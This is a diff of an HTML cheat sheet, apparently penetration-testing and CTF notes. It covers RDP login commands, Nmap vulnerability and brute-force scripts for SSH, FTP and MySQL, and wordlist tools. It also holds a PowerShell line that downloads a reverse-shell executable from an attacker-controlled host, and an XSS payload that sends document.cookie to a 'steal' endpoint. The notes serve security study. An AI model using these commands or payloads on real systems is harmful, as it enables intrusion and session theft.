@@ -14,23 +14,33 @@ There is a :
 	<li> resume my stars-->
 </ol>
 
-<h2 align='center' id='n1'><em>Commands</em></h2> 
-<h3>Remote Desktop Protocol (rdp)</h3>
-  <code>xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:&lt;MACHINE_IP> /u:&lt;Username> /p:&lt;'Password'></code>
-  <p><code>xfreerdp /v:&lt;MACHINE_IP> /u:&lt;Username> /p:&lt;Password> +clipboard</code>
+<h2 align='center' id='n1'><em> Example Commands</em></h2> 
+<h3>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Remote Desktop Protocol (rdp)</h3>
+  <code>xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:&lt;TARGET_IP> /u:&lt;USERNAME> /p:&lt;'PASSWORD'></code>
+  <p><code>xfreerdp /v:&lt;TARGET_IP> /u:&lt;USERNAME> /p:&lt;PASSWORD> +clipboard</code>
 	
-<h3>To get stable shell from unstable from PowerShell</h3>
-  <code>powershell -c "Invoke-WebRequest -Uri 'http://&lt;IP>:&lt;PORT>/&lt;filename>' -OutFile 'C:\Windows\Temp\&lt;filename>'"</code>
-  <p> where filename is reverse shell
+<h3>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;To get stable shell from unstable from PowerShell</h3>
+  <code>powershell -c "Invoke-WebRequest -Uri 'http://&lt;LOCAL_IP>:&lt;PORT>/&lt;FILENAME.exe>' -OutFile 'C:\Windows\Temp\&lt;FILENAME.exe>'"</code>, where filename is the reverse shell
   
-<h3>Commands to find in:</h3>
-<h4>Linux</h4>
+<h3>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Commands to find in:</h3>
+<h4>&nbsp;&nbsp;&nbsp;Linux</h4>
 	<p> <code>find / -type f</code> - Find all files in / directory
 	<p> <code>find / -type f | grep 'flag'</code> - Find all files with 'flag' in file name
 	<p> <code>find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null</code> - Find all path files with ‘config’ 
+		
+<h3>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Nmap</h3>
+Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'>download</a> script files from github and install it. Thanks for that, Vulners Team!
 
+   <p> <code> Nmap -Pn &lt;TARGET_IP> --script=vulnerse.nse -p &lt;PORT(S)></code> - Checking for a vulnerability in the software on the server.
+   <p> <code> nmap --script ssh-brute -p22 &lt;TARGET_IP> --script-args userdb=users.lst,passdb=passwords.lst</code> - Checking brute force resistance on ssh
+   <p> <code> nmap -d --script ftp-brute -p &lt;TARGET_IP></code> - Checking brute force resistance on ftp
+   <p> <code> nmap -sV --script=mysql-empty-password &lt;TARGET_IP></code> - Checking mysql anonymous login
+   <p> <code> nmap --script mysql-brute -p 3306 &lt;TARGET_IP> --script-args userdb=users.lst, passdb=passwords.lst</code> - Attempts to select a pair of login/password to enter the mysql database
+   <p> <code> nmap -sV -p &lt;PORT> –script http-enum &lt;TARGET_IP></code> - Search for hidden folders and files
+   <p> P.S. If CMS, research <code>^&t;name_0f_CMS_0r_DB> brute force nmap</code>
+	
 <h2 align='center' id='n2'><em>Payloads</em></h2>
-    <h3>XSS Payloads</h3>
+    <h3>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XSS Payloads</h3>
     <li> <b>Proof Of Concept (PoC)</b> - <code><script>alert('Success XSS!');</script></code>
       <p>This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text "Success XSS".
     <li> <b>Session Srealing</b> - <code><script>fetch('url/steal?cookie=' + btoa(document.cookie));</script></code>
@@ -65,7 +75,7 @@ There is a :
 		<li><h3><a href='https://www.kali.org/tools/ncurses-hexedit/'>Hexeditor</a></h3>
 	        	<p> Tools for change files signature. <a href='https://en.wikipedia.org/wiki/List_of_file_signatures'>Link</a> to Wiki with List of file signatures. 
 		<li><h3><a href='https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master'>Tool</a> for hash identification.</h3> 
-			<p> Python file. Very useful.
+			<p> Python file. Powerful.
 		<li><h3><a href='https://www.kali.org/tools/crunch/'>Crunch</a></h3>
 		   <p> This is one of many powerful tools for creating an offline wordlist. With crunch, you can specify numerous options, including min, max, and options. The following example creates a wordlist containing all possible combinations of 3 characters, including 1-5 and qwerty. You can use the -o argument to save. <p>Example: <code>crunch 3 3 12345qwerty -o cranch.txt</code>.
 		<li><h3><a href='https://github.com/therodri2/username_generator'>Username generator</h3>
